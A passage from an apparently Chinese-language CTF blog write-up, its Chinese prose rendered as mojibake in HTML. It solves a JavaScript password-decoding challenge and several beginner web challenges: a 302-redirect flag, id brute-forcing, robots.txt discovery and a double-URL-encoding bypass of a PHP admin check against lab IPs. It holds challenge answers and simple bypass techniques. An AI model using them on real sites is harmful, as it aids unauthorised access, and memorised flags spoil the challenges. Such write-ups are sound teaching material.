<span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">è§£é‡Šï¼šè¿™é‡Œçš„<span class="keyword">for</span>å¾ªç¯å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œæ³¨æ„è¿™é‡Œçš„<span class="variable">p</span>å€¼ç”±äºç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯æ‰§è¡Œåç°åœ¨å·²ç»æ˜¯<span class="variable">FAUX</span> <span class="variable">P</span>äº†</span><br><span class="line">åŠ ä¸Šç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯çš„<span class="variable">p</span>å€¼ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">å› ä¸º<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">æ‰€ä»¥ï¼š<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">å› æ­¤ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> å³ <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> æœ€åå‡½æ•°è¾“å‡ºä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">å—¯å“¼ï¼Ÿï¼Ÿï¼Ÿè¿™ä¸ªå‡½æ•°å°±æ‰§è¡Œå®Œäº†ï¼Ÿï¼Ÿï¼Ÿæˆ‘çš„<span class="variable">tab</span>æ•°ç»„æ€ä¹ˆæ²¡æœ‰ç”¨åˆ°ï¼Ÿï¼Ÿï¼Ÿï¼Œæˆ‘ä¸€å¼€å§‹å¸¦è¿›æ¥çš„å‚æ•°å‘¢ï¼Ÿå»å“ªäº†ï¼Ÿåˆ«æƒ³äº†ï¼Œè¾“å‡ºå€¼è™½ç„¶ç”¨åˆ°äº†å¸¦è¿›æ¥çš„å‚æ•°(å°±æ˜¯åˆ†å‰²åçš„<span class="variable">tab</span>æ•°ç»„)ï¼Œä½†æ˜¯<span class="keyword">for</span>å¾ªç¯é‚£é‡Œäººå®¶ç›´æ¥ä½¿ç”¨<span class="variable">tab2</span>æ•°ç»„ç›¸å…³ä»£ç çš„å€¼ï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°<span class="variable">tab</span>æ•°ç»„çš„å€¼ï¼Œæ‰€ä»¥ç”±äºä»£ç é€»è¾‘é—®é¢˜ï¼Œä½ ä¼ å…¥çš„<span class="variable">dechiffre</span>çš„å‚æ•°<span class="variable">pass_enc</span>æ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„</span><br><span class="line"></span><br><span class="line">ä¸‰ã€<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œç»§ç»­æ‰§è¡Œå…¶å®ƒçš„ä»£ç </span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>ä½ è¾“å…¥å¼¹æ¡†å†…çš„å†…å®¹</span><br><span class="line">ä¹‹å<span class="variable">alert</span>å¼¹å‡º<span class="title function_">dechiffre</span>(<span class="variable">h</span>)çš„å€¼ï¼Œç”±å‰é¢æ‰€æœ‰çš„ä»£ç å¯çŸ¥ï¼Œä»£ç é‡Œ<span class="variable">p</span>çš„å€¼ä¸<span class="variable">tab</span>æ— å…³ï¼Œå› ä¸ºæœ€ç»ˆéƒ½ä¼šè¢«<span class="variable">tab2</span>çš„å€¼æ›¿ä»£ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>ï¼Œæ— è®ºè¾“å…¥çš„è¿™ä¸ª<span class="variable">h</span>ç­‰äºä»€ä¹ˆï¼Œä¸ç®¡<span class="variable">tab</span>èƒ½å¦è¢«åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œéƒ½åªä¼šåˆ©ç”¨åˆ°<span class="variable">tab2</span>ã€‚é€šä¿—ç‚¹è®²ï¼Œæœ‰å…³<span class="variable">tab</span>çš„å‚æ•°ä¸å€¼éƒ½å¯ä»¥è§†ä¸ºæ²¡æœ‰ï¼Œå› æ­¤ï¼Œ<span class="variable">pass_enc</span>å‚æ•°æ˜¯ä»€ä¹ˆä¹Ÿå°±æ²¡æœ‰æ„ä¹‰äº†</span><br><span class="line"></span><br><span class="line">å››ã€æœ€åï¼Œç»“è®ºå°±æ˜¯ï¼Œæ— è®ºæˆ‘ä»¬åœ¨å¼¹æ¡†ä¸­è¾“å…¥ä»€ä¹ˆå€¼ï¼Œéƒ½åªä¼šè¿”å›<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">æˆ‘å°±çŒœæƒ³ï¼Œä¼šä¸ä¼š<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));è¿™ä¸ªè¯­æ³•é”™è¯¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ²¡è®¡ç®—å‡ºæ¥çš„æ˜¯ä¸æ˜¯æœ€åæ­£ç¡®çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">äºæ˜¯ï¼Œæˆ‘ä¸ç”¨å®ƒè¿™ä¹ˆæ— è®º<span class="variable">pass_enc</span>å‚æ•°è¾“å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>çš„å‡½æ•°ï¼Œå’±ä¹ŸæŠ›å¼ƒå®ƒä¸€å›ï¼Œè‡ªå·±é‡æ–°å†™ä»£ç æ‰§è¡Œå®ƒ</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">æœ€åç»“æœä¸ºï¼š<span class="number">786</span>OsErtk12</span><br><span class="line">æ ¹æ®æç¤ºçš„<span class="variable">flag</span>æ ¼å¼è¾“å…¥æœ€åçš„<span class="variable">flag</span>ï¼</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() æ–¹æ³•ç”¨äºæŠŠä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">separator        å¯é€‰ã€‚å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»è¯¥å‚æ•°æŒ‡å®šçš„åœ°æ–¹åˆ†å‰² <span class="built_in">string</span> Objectã€‚æ¯”å¦‚æ­¤é¢˜ä»¥é€—å·åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line"><span class="built_in">limit</span>            å¯é€‰ã€‚è¯¥å‚æ•°å¯æŒ‡å®šè¿”å›çš„æ•°ç»„çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœè®¾ç½®äº†è¯¥å‚æ•°ï¼Œè¿”å›çš„å­ä¸²ä¸ä¼šå¤šäºè¿™ä¸ªå‚æ•°æŒ‡å®šçš„æ•°ç»„ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¯¥å‚æ•°ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸è€ƒè™‘å®ƒçš„é•¿åº¦ã€‚</span><br><span class="line">ä¸¾ä¾‹ï¼šstr=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   å¯¹strä»¥é€—å·è¿›è¡Œåˆ†å‰²ï¼Œåˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„å†…çš„å€¼æœ€å¤šåªèƒ½æœ‰<span class="number">3</span>ä¸ªï¼Œç»“æœå°±æ˜¯1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="keyword">for</span> (è¯­å¥ <span class="number">1</span>; è¯­å¥ <span class="number">2</span>; è¯­å¥ <span class="number">3</span>) &#123;</span><br><span class="line">     è¦æ‰§è¡Œçš„ä»£ç å—</span><br><span class="line">&#125;</span><br><span class="line">è¯­å¥ <span class="number">1</span> åœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰å¼€å§‹ä¹‹å‰æ‰§è¡Œã€‚</span><br><span class="line">è¯­å¥ <span class="number">2</span> å®šä¹‰è¿è¡Œå¾ªç¯ï¼ˆä»£ç å—ï¼‰çš„æ¡ä»¶ã€‚</span><br><span class="line">è¯­å¥ <span class="number">3</span> ä¼šåœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰æ¯æ¬¡è¢«æ‰§è¡Œåæ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() å¯æ¥å—ä¸€ä¸ªæŒ‡å®šçš„ Unicode å€¼ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">è¯­æ³•ï¼šString.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">n1, n2, ..., nX     å¿…éœ€ã€‚ä¸€ä¸ªæˆ–å¤šä¸ª Unicode å€¼ï¼Œå³è¦åˆ›å»ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¿›è¡Œè¾“å…¥çš„å¯¹è¯æ¡†ã€‚</span><br><span class="line">è¿™ä¸ªæ–¹æ³•è¿”å›ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">å‚æ•°                æè¿°</span><br><span class="line">msg                å¯é€‰ã€‚è¦åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œä¸æ˜¯ HTML æ ¼å¼çš„æ–‡æœ¬ï¼‰å°±æ˜¯å¼¹æ¡†æ˜¾ç¤ºæ–‡æœ¬ã€‚</span><br><span class="line">defaultText        å¯é€‰ã€‚é»˜è®¤çš„è¾“å…¥æ–‡æœ¬ï¼Œä½ è¾“å…¥ä»€ä¹ˆå¼¹æ¡†ä¸€å¼€å§‹å‡ºç°é‡Œé¢çš„è¾“å…¥æ¡†å°±ä¼šé»˜è®¤æ˜¾ç¤ºä½ è¿™ä¸ªæ–‡æœ¬ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">è¿™ä¸ªè¡¨ç¤ºå£°æ˜å˜é‡i,j,k,l,m,n,o,pï¼Œåªæœ‰lå’Œpä¸¤ä¸ªå˜é‡è¢«èµ‹å€¼äº†ï¼Œå…¶å®ƒçš„å˜é‡éƒ½æ˜¯ä¸å¸¦å€¼çš„ï¼Œä¸å¸¦æœ‰å€¼çš„å˜é‡ï¼Œå®ƒçš„å€¼å°†æ˜¯undefinedï¼Œåç»­ä»£ç ä¸­å¯ä»¥ç»™å®ƒèµ‹å€¼ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> å±æ€§å¯è®¾ç½®æˆ–è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><h1 id="Webè¿›é˜¶"><a href="#Webè¿›é˜¶" class="headerlink" title="Webè¿›é˜¶"></a>Webè¿›é˜¶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-é¢˜ç›®æè¿°-11"><a href="#1-é¢˜ç›®æè¿°-11" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª</p><h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> å¼€å§‹ç•Œé¢å¦‚ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220625162533345.png" alt="image-20220625162533345"></p><p>æ²¡æœ‰å¤´ç»ªï¼Œä½†æ˜¯æè¿°é‡Œæœ‰é¦–é¡µï¼Œå†æ ¹æ®urlçŸ¥é“è¿™æ˜¯ä¸ªphpç½‘ç«™</p><p>phpç½‘ç«™é¦–é¡µæ–‡ä»¶å°±æ˜¯index.php</p><p><code>index.phpæ–‡ä»¶æ˜¯ä¸€ä¸ªphpç½‘ç«™é¦–é¡µæ–‡ä»¶ï¼Œindexæ˜¯æ™®éæ„ä¹‰ä¸Šçš„â€œé¦–é¡µâ€ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥ä¸€ä¸ªåŸŸååä¼šæ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯index.xxxxï¼ˆåŸºæœ¬ä¸Šé¦–é¡µéƒ½ä¸ä¼šæŠŠindex.xxxxæ˜¾ç¤ºåœ¨urlé‡Œï¼Œä½†ä¹Ÿä¸ç»å¯¹ï¼‰</code></p><p>è¯•è¯•<code>111.200.241.244:59074/index.php</code></p><p>ç»“æœåˆä¼šåˆ°1.phpï¼Œurlåˆå˜æˆ<code>111.200.241.244:59074/1.php</code></p><p>F12æ‰“å¼€æŸ¥çœ‹ç½‘ç»œ</p><p><img src="/2022/06/21/Gongfang-wp/image-20220625171731934.png" alt="image-20220625171731934"></p><p><code>è¡¥å……ï¼š</code></p><p> <code>index.phpçš„çŠ¶æ€æ˜¯302ä»€ä¹ˆæ„æ€ï¼Ÿ</code></p><p><code>302 Foundï¼ŒåŸå§‹æè¿°çŸ­è¯­ä¸º Moved Temporarily(ä¸´æ—¶æ¬å®¶ï¼‰ ï¼Œæ˜¯[HTTPåè®®](https://baike.baidu.com/item/HTTPåè®®)ä¸­çš„ä¸€ä¸ªçŠ¶æ€ç (Status Code)ã€‚å¯ä»¥ç®€å•çš„ç†è§£ä¸ºè¯¥èµ„æºåŸæœ¬ç¡®å®å­˜åœ¨ï¼Œä½†å·²ç»è¢«**ä¸´æ—¶**æ”¹å˜äº†ä½ç½®ï¼›æ¢è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è¯·æ±‚çš„èµ„æºæš‚æ—¶é©»ç•™åœ¨ä¸åŒçš„URIä¸‹ï¼Œæ•…è€Œé™¤éç‰¹åˆ«æŒ‡å®šäº†ç¼“å­˜å¤´éƒ¨æŒ‡ç¤ºï¼Œè¯¥çŠ¶æ€ç ä¸å¯ç¼“å­˜ã€‚</code></p><p>å‘ç°ç¡®å®æ˜¯è·³è½¬åˆ°äº†index.phpä½†ä¸ºä»€ä¹ˆåˆå›åˆ°1.php</p><p><img src="/2022/06/21/Gongfang-wp/image-20220625171819943.png" alt="image-20220625171819943"></p><p>å¯ä»¥çœ‹åˆ°location:1.phpï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ— æ³•ç›´æ¥è®¿é—®index.phpçš„åŸå› ï¼Œä½†flagå·²ç»å¾—åˆ°</p><p>å¾—åˆ°flag</p><hr><p>å¦‚æœç”¨burpsuiteæŸ¥çœ‹<code>111.200.241.244:59074/index.php</code>ï¼Œåªèƒ½çœ‹åˆ°Flag is hidden!ï¼Œä¹Ÿç®—æ˜¯æç¤º</p><p><img src="/2022/06/21/Gongfang-wp/image-20220625172122211.png" alt="image-20220625172122211"></p><h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-é¢˜ç›®æè¿°-12"><a href="#1-é¢˜ç›®æè¿°-12" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</p><h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ‰“å¼€ç•Œé¢æœ‰äº›å“äºº</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626084029917.png" alt="image-20220626084029917"></p><p>ä½†åªæœ‰æŠ¥è¡¨ä¸­å¿ƒèƒ½æ‰“å¼€</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626084102777.png" alt="image-20220626084102777"></p><p>çœ‹åˆ°urlå°±æœ‰æ€è·¯äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•idçˆ†ç ´</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626084318243.png" alt="image-20220626084318243"></p><p>åˆ©ç”¨Numbersæ–¹å¼ï¼Œä»1åˆ°5000ï¼Œå‘ç°2333å¤„æˆåŠŸçˆ†ç ´</p><p>å¾—åˆ°flag</p><h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-é¢˜ç›®æè¿°-13"><a href="#1-é¢˜ç›®æè¿°-13" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å’Œä¸Šé¢æ–°æ‰‹åŒºçš„é¢˜ç±»ä¼¼</p><p>å…ˆè®¿é—®<code>http://111.200.241.244:51820/robots.txt</code>å¾—åˆ°phpæ–‡ä»¶å</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626090904204.png" alt="image-20220626090904204"></p><p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p><p>å¾—åˆ°flag</p><h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-é¢˜ç›®æè¿°-14"><a href="#1-é¢˜ç›®æè¿°-14" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™å¥è¯çš„æ„æ€æ˜¯â€ä½ èƒ½è¯æ˜è¿™ä¸ªç½‘ç«™å­˜åœ¨å—â€œ</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626104943938.png" alt="image-20220626104943938"></p><p>æ²¡æœ‰æ€è·¯ï¼ŒæŠ“åŒ…ï¼Œå’Œå¾¡å‰‘ã€dirsearchéƒ½æ²¡åˆå¾—åˆ°æƒ³è¦çš„ç»“æœ</p><p>æ²¡æœ‰åŠæ³•ï¼Œæœäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„wp</p><p>äº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹phps</p><p><code>phpså³ä¸ºPHP Sourceï¼šphpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚å…¶å®ï¼Œåªè¦ä¸ç”¨phpç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„MIMEç±»å‹ä¸ºæ–‡ä»¶å³å¯ï¼Œä½†ä¸ºäº†å›½é™…é€šç”¨ï¼Œæ‰€ä»¥æ‰ç”¨äº†phpsæ–‡ä»¶ç±»å‹ã€‚</code></p><p>è®¿é—®<code>http://111.200.241.244:51703/index.phps</code>ï¼Œå¾—åˆ°æºç å†…å®¹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626105416606.png" alt="image-20220626105416606"></p><p>å³é”®æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç çŸ¥é“ï¼Œå½“id&#x3D;adminï¼Œè¾“å‡ºnot allowed!ï¼Œä½†æ˜¯æƒ³è¦è¾“å‡ºflag</p><p>å°±éœ€è¦æ³¨æ„è¿™å¥è¯­å¥<code>$_GET[id] = urldecode($_GET[id]);</code></p><p><code>urldecode:æœ¬å‡½æ•°å¯¹å­—ç¬¦ä¸²è¿›è¡ŒURLè§£ç ã€‚ä¾‹å¦‚é€šè¿‡urlencodeç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡UrlDecodeè¿›è¡Œè§£ç ã€‚å¯¹Urlè·¯å¾„åŠ ç çš„å‡½æ•°æ˜¯UrlEncode  ç”¨æ³•ç›¸åï¼Œå’ŒUrlDecodeæ˜¯ä¸€è‡´å¯¹åº”çš„</code></p><p>è¿™é‡Œæˆ‘ä»¬å°±æ¸…æ¥šäº†ï¼Œéœ€è¦æŠŠadminè¿›è¡Œurlç¼–ç ï¼Œä½†æ˜¯åªå¯¹å…¶è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œè¦çŸ¥é“ç½‘ç«™æœ¬èº«å¯¹urlç¼–ç å°±æœ‰è§£ç çš„èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯åœ¨urldecodeå‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œç½‘ç«™å·²ç»æŠŠç¼–ç è§£ç ä¸ºadminï¼Œä»è€Œåªè¾“å‡ºnot allowed!</p><p>æ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å¯¹adminè¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œç¬¬ä¸€è¢«ç½‘ç«™è§£ç ï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªifï¼Œç„¶ååœ¨urldecodeå‡½æ•°é‡Œè¿›è¡Œç¬¬äºŒæ¬¡è§£ç ï¼Œå˜æˆadminï¼Œä»è€Œè¾“å‡ºKey(flag)</p><p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p><p>è¿™é‡Œçš„%25%36%31æ˜¯å­—æ¯açš„äºŒæ¬¡urlç¼–ç ç”±aç¬¬ä¸€æ¬¡ç¼–ç 